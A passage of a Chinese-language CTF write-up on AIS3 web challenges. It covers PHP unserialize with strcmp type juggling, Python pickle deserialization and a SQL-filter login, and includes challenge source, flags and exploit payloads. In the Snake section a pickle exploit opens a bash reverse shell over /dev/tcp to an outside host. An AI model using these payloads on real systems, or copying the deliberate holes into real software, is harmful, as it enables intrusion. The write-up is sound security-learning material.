class="keyword">if</span> (<span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(SESSION, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>)), <span class="title function_ invoke__">time</span>() + <span class="number">600</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$data</span> = @<span class="variable">$_COOKIE</span>[SESSION]) &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Elephant&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&#x27;utf-8&#x27;</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> id=<span class="string">&quot;bootstrap-css&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (!<span class="variable">$user</span>): <span class="meta">?&gt;</span></span><br><span class="line">        &lt;div id=<span class="string">&quot;login&quot;</span>&gt;</span><br><span class="line">            &lt;h3 <span class="class"><span class="keyword">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">white</span> <span class="title">pt</span>-5&quot;&gt;<span class="title">Are</span> <span class="title">you</span> <span class="title">familiar</span> <span class="title">with</span> <span class="title">PHP</span>?&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">login</span>-<span class="title">row</span>&quot; <span class="title">class</span>=&quot;<span class="title">row</span> <span class="title">justify</span>-<span class="title">content</span>-<span class="title">center</span> <span class="title">align</span>-<span class="title">items</span>-<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">login</span>-<span class="title">column</span>&quot; <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-6&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">login</span>-<span class="title">box</span>&quot; <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-12&quot;&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">form</span> <span class="title">id</span>=&quot;<span class="title">login</span>-<span class="title">form</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>&quot; <span class="title">action</span>=&quot;&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">info</span>&quot;&gt;<span class="title">What</span>&#x27;<span class="title">s</span> <span class="title">your</span> <span class="title">name</span>!?&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                    &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">name</span>&quot; <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">info</span>&quot;&gt;<span class="title">Name</span>:&lt;/<span class="title">label</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">                                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">name</span>&quot; <span class="title">id</span>=&quot;<span class="title">name</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">info</span> <span class="title">btn</span>-<span class="title">md</span>&quot; <span class="title">value</span>=&quot;<span class="title">let</span> <span class="title">me</span> <span class="title">in</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">else</span>: ?&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">white</span> <span class="title">pt</span>-5&quot;&gt;<span class="title">You</span> <span class="title">may</span> <span class="title">want</span> <span class="title">to</span> <span class="title">read</span> <span class="title">the</span> <span class="title">source</span> <span class="title">code</span>.&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">text</span>-<span class="title">align</span>: <span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">images</span>/<span class="title">elephant2</span>.<span class="title">png</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">hr</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span> <span class="title">justify</span>-<span class="title">content</span>-<span class="title">center</span> <span class="title">align</span>-<span class="title">items</span>-<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-6&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-12&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">info</span>&quot;&gt;<span class="title">Do</span> <span class="title">you</span> <span class="title">know</span>?&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">info</span>&quot;&gt;<span class="title">PHP</span>&#x27;<span class="title">s</span> <span class="title">mascot</span> <span class="title">is</span> <span class="title">an</span> <span class="title">elephant</span>!&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                        <span class="title">Hello</span>, &lt;<span class="title">b</span>&gt;&lt;?= $<span class="title">user</span>-&gt;<span class="title">name</span> ?&gt;&lt;/<span class="title">b</span>&gt;!</span></span><br><span class="line"><span class="class">                        &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">user</span>-&gt;<span class="title">canReadFlag</span>()): ?&gt;</span></span><br><span class="line"><span class="class">                            <span class="title">This</span> <span class="title">is</span> <span class="title">your</span> <span class="title">flag</span>: &lt;<span class="title">b</span>&gt;&lt;?= $<span class="title">flag</span> ?&gt;&lt;/<span class="title">b</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;?<span class="title">php</span> <span class="title">else</span>: ?&gt;</span></span><br><span class="line"><span class="class">                            <span class="title">Your</span> <span class="title">token</span> <span class="title">is</span> <span class="title">not</span> <span class="title">sufficient</span> <span class="title">to</span> <span class="title">read</span> <span class="title">the</span> <span class="title">flag</span>!</span></span><br><span class="line"><span class="class">                        &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">logout</span>&quot;&gt;<span class="title">Logout</span>!&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">endif</span> ?&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>只要讓 <code>strcmp($flag, $this-&gt;token) == 0</code> 就好啦，那 <code>strcmp</code> 已知的問題就是他 compare 陣列隨然會噴 Warning，但結果會是 <code>NULL</code>，而這裡是用兩個 <code>=</code> 不是三個，所以 <code>NULL == 0</code>，把下面這段 base64 encode 後放回 Cookie 就完成啦。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:11:&quot;\x00User\x00token&quot;;a:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;0nly_3l3ph4n75_5h0uld_0wn_1v0ry&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Snake">Snake</h3>
<p>這題網站在 <a target="_blank" rel="noopener" href="https://snake.ais3.org/">https://snake.ais3.org/</a> ，首頁就是原始碼了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, request</span><br><span class="line"><span class="keyword">import</span> pickle, base64, traceback</span><br><span class="line"></span><br><span class="line">Response.default_mimetype = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    data = request.values.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = base64.b64decode(data)</span><br><span class="line">            data = pickle.loads(data)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> data <span class="keyword">and</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> traceback.format_exc()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br></pre></td></tr></table></figure>
<p>給他 data，他會 <code>pickle.loads</code>，沒有任何檢查，所以直接 reverse shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span>(os.system, ((<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/1.2.3.4/9999 0&gt;&amp;1&quot;&#x27;</span>),))</span><br><span class="line"></span><br><span class="line">ex = Exploit()</span><br><span class="line"><span class="built_in">print</span>(b64decode(pickle.dumps(ex)))</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Owl">Owl</h3>
<p>這題網站在 <a target="_blank" rel="noopener" href="https://turtowl.ais3.org/%EF%BC%8C%E9%A6%96%E9%A0%81%E6%9C%89%E7%99%BB%E5%85%A5%E9%A0%81%E9%9D%A2%EF%BC%8C%E4%BB%96%E6%9C%89%E5%80%8B%E7%99%BD%E8%89%B2%E5%AD%97%E5%AF%AB">https://turtowl.ais3.org/，首頁有登入頁面，他有個白色字寫</a> <code>GUESS THE STUPID USERNAME / PASSWORD</code>，猜 <code>admin/admin</code> 就登進去了，登進去後，又有個白色字按鈕寫 <code>SHOW HINT</code>，點下去就看到原始碼了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Settings</span></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_startup_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line">    <span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Taipei&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CSRF</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_key&#x27;</span>]))</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_key&#x27;</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>() * <span class="title function_ invoke__">rand</span>());</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;csrf.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$csrf</span> = <span class="keyword">new</span> <span class="title class_">Csrf</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_key&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$action</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">redirect</span>(<span class="params"><span class="variable">$path</span> = <span class="string">&#x27;/&#x27;</span>, <span class="variable">$message</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$alert</span> = <span class="variable">$message</span> ? <span class="string">&#x27;alert(&#x27;</span> . <span class="title function_ invoke__">json_encode</span>(<span class="variable">$message</span>) . <span class="string">&#x27;)&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$path</span> = <span class="title function_ invoke__">json_encode</span>(<span class="variable">$path</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;<span class="subst">$alert</span>; document.location.replace(<span class="subst">$path</span>);&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;logout&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">            <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;login&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// Validate CSRF token</span></span><br><span class="line">            <span class="variable">$token</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;csrf_token&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$token</span> || !<span class="variable">$csrf</span>-&gt;<span class="title function_ invoke__">validate</span>(<span class="variable">$token</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;invalid csrf_token&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if username and password are given</span></span><br><span class="line">            <span class="variable">$username</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            <span class="variable">$password</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$username</span> || !<span class="variable">$password</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;username and password should not be empty&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Get rid of sqlmap kiddies</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>], <span class="string">&#x27;sqlmap&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;sqlmap is child&#x27;s play&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Get rid of you</span></span><br><span class="line">            <span class="variable">$bad</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/*&#x27;</span>, <span class="string">&#x27;*/&#x27;</span>, <span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;where&#x27;</span>, <span class="string">&#x27;from&#x27;</span>, <span class="string">&#x27;--&#x27;</span>];</span><br><span class="line">            <span class="variable">$username</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$bad</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">            <span class="variable">$username</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$bad</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Auth</span></span><br><span class="line">            <span class="variable">$hash</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>);</span><br><span class="line">            <span class="variable">$row</span> = (<span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&#x27;/db.sqlite3&#x27;</span>))</span><br><span class="line">                -&gt;<span class="title function_ invoke__">querySingle</span>(<span class="string">&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">$username</span>&#x27; AND password = &#x27;<span class="subst">$hash</span>&#x27;&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;login failed&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;unknown action: <span class="subst">$action</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user</span> = @<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;🦉🦉🦉🦉&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&#x27;utf-8&#x27;</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> id=<span class="string">&quot;bootstrap-css&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (!<span class="variable">$user</span>): <span class="meta">?&gt;</span></span><br><span class="line">        &lt;div id=<span class="string">&quot;login&quot;</span>&gt;</span><br><span class="line">            &lt;h3 <span class="class"><span class="keyword">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">white</span> <span class="title">pt</span>-5&quot;&gt;<span class="title">GUESS</span> <span class="title">THE</span> <span class="title">STUPID</span> <span class="title">USERNAME</span> / <span class="title">PASSWORD</span>&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">login</span>-<span class="title">row</span>&quot; <span class="title">class</span>=&quot;<span class="title">row</span> <span class="title">justify</span>-<span class="title">content</span>-<span class="title">center</span> <span class="title">align</span>-<span class="title">items</span>-<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">login</span>-<span class="title">column</span>&quot; <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-6&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">login</span>-<span class="title">box</span>&quot; <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-12&quot;&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">form</span> <span class="title">id</span>=&quot;<span class="title">login</span>-<span class="title">form</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>&quot; <span class="title">action</span>=&quot;?<span class="title">action</span>=<span class="title">login</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">hidden</span>&quot; <span class="title">name</span>=&quot;<span class="title">csrf_token</span>&quot; <span class="title">value</span>=&quot;&lt;?= <span class="title">htmlentities</span>($<span class="title">csrf</span>-&gt;<span class="title">generate</span>()) ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">info</span>&quot;&gt;🦉: &quot;<span class="title">Login</span> <span class="title">to</span> <span class="title">see</span> <span class="title">cool</span> <span class="title">things</span>!&quot;&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                    